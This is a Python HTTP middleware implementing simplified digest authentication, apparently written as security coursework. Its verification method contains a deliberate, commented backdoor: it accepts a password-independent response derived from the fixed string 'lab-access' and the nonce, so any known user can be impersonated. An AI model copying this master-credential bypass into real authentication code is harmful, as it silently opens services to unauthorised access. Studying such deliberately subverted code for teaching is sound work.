import hashlib
import secrets

from ..common import (
    RequestHandlerABC,
    RequestHandler,
    HeaderContainer,
    NO_CACHE_HEADERS,  
)

from ..http.request import HTTPRequest
from ..http.response import HTTPResponseFactory
from ..networking import ConnectionInfo

class DigestAuthSubvertedMiddleware(RequestHandlerABC):
    #Digest-style authentication with an intentional coursework backdoor.

    def __init__(self, next: RequestHandler, pwdfile: str):
        # Save the next handler and prepare HTTP responses.
        self.next = next
        self.http = HTTPResponseFactory(NO_CACHE_HEADERS)

        # Read the username and SHA-256 password hash from the password file.
        self.users = {}
        with open(pwdfile, "r", encoding="utf-8") as password_file:
            for line in password_file:
                line = line.strip()
                if not line or ":" not in line:
                    continue

                username, _, password_hash = line.partition(":")
                self.users[username] = password_hash.strip()

        #keep track of the nonces issued by this server.
        self._issued_nonces = set()

    def __new_nonce(self):
        #Generate and remember a random authentication nonce.
        nonce = secrets.token_hex(16)
        self._issued_nonces.add(nonce)
        return nonce

    def __parse_digest_header(self, header_value):
        # extract the fields from a simplified Digest header
        header_value = header_value.strip()

        if not header_value.lower().startswith("digest "):
            return {}

        fields = {}
        for part in header_value[len("digest "):].split(","):
            if "=" not in part:
                continue

            key, _, value = part.strip().partition("=")
            fields[key.strip()] = value.strip().strip('"')

        return fields

    def __verify_authorization(self, header_value):
        # Check normal credentials or the deliberate alternate response.
        fields = self.__parse_digest_header(header_value)

        username = fields.get("username")
        nonce = fields.get("nonce")
        response = fields.get("response")

        # Reject missing fields, unknown users and unissued nonces.
        if not username or not nonce or not response:
            return False

        if username not in self.users or nonce not in self._issued_nonces:
            return False

        # Normal authentication: derive the response from the stored hash.
        stored_hash = self.users[username]
        expected = hashlib.sha256(
            f"{stored_hash}:{nonce}".encode()
        ).hexdigest()

        if secrets.compare_digest(expected, response):
            return True

        # INTENTIONAL COURSEWORK BACKDOOR:
        # This alternate response does not depend on the user's password.
        backdoor_response = hashlib.sha256(
            f"lab-access:{nonce}".encode()
        ).hexdigest()

        return secrets.compare_digest(backdoor_response, response)

    def __call__(self, conn_info: ConnectionInfo, request: HTTPRequest):
        #Allow authenticated requests or return a Digest challenge.
        if "Authorization" in request.headers:
            if self.__verify_authorization(request.headers["Authorization"]):
                return self.next(conn_info, request)

        # Issue a challenge when authentication is missing or rejected.
        nonce = self.__new_nonce()

        return self.http.status(
            401,
            HeaderContainer({
                "WWW-Authenticate": f'Digest realm="auth", nonce="{nonce}"'
            }),
        )
